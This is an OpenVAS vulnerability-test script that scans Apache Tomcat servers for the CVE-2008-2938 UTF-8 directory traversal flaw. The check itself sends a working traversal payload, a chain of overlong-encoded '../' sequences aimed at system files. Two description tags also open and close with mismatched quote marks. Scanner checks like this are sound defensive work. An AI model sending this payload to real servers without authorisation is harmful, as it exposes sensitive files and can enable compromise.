###############################################################################
# OpenVAS Vulnerability Test
#
# Apache Tomcat 'UTF-8' Directory Traversal Vulnerability
#
# Authors:
# Christian Fischer <christian.fischer@greenbone.net>
#
# Copyright:
# Copyright (C) 2018 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:apache:tomcat";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.108476");
  script_version("2019-05-10T11:41:35+0000");
  script_cve_id("CVE-2008-2938");
  script_tag(name:"last_modification", value:"2019-05-10 11:41:35 +0000 (Fri, 10 May 2019)");
  script_tag(name:"creation_date", value:"2018-10-22 15:32:08 +0200 (Mon, 22 Oct 2018)");
  script_bugtraq_id(30633);
  script_name("Apache Tomcat 'UTF-8' Directory Traversal Vulnerability");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:N/A:N");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2018 Greenbone Networks GmbH");
  script_dependencies("gb_apache_tomcat_consolidation.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("apache/tomcat/http/detected");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/30633");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/6229/");
  script_xref(name:"URL", value:"https://www.securityfocus.com/archive/1/499926");

  script_tag(name:"summary", value:"Apache Tomcat is prone to a directory-traversal
  vulnerability because it fails to sufficiently sanitize user-supplied input.");

  script_tag(name:"impact", value:"A remote attacker could exploit this vulnerability using directory-
  traversal strings (such as '../') to gain access to arbitrary files on the targeted system. This may
  result in the disclosure of sensitive information or lead to a complete compromise of the affected computer.");

  script_tag(name:"affected", value:'Apache Tomcat versions before 4.1.39, 5.x before 5.5.27 and 6.x before 6.0.18 are vulnerable.");

  script_tag(name:"insight", value:"Originally reported as a Tomcat vulnerability the root cause of this issue is that
  the JVM does not correctly decode UTF-8 encoded URLs to UTF-8. This exposes a directory traversal vulnerability when
  the connector uses URIEncoding="UTF-8". This directory traversal is limited to the docBase of the web application.

  If a context is configured with allowLinking="true" then the directory traversal vulnerability is extended to the
  entire file system of the host server.

  It should also be noted that setting useBodyEncodingForURI="true" has the same effect as setting URIEncoding="UTF-8"
  when processing requests with bodies encoded with UTF-8.

  Although the root cause was quickly identified as a JVM issue and that it affected multiple JVMs from multiple vendors,
  it was decided to report this as a Tomcat vulnerability until such time as the JVM vendors provided updates to resolve
  this issue. For further information on the status of this issue for your JVM, contact your JVM vendor.');

  script_tag(name:"solution", value:"Update Apache Tomcat to version 4.1.39, 5.5.27 or 6.0.18 or later which includes
  a workaround that protects against this and any similar character encoding issues that may still exist in the JVM.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) ) exit( 0 );
if( ! dir  = get_app_location( cpe:CPE, port:port ) ) exit( 0 );
if( dir == "/" ) dir = "";

files = traversal_files();

foreach pattern( keys( files ) ) {

  file = files[pattern];

  url = string( dir, "//%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/" + file );

  if( http_vuln_check( port:port, url:url, pattern:pattern ) ) {
    report = report_vuln_url( url:url, port:port );
    security_message( port:port, data:url );
  }
}

exit( 0 );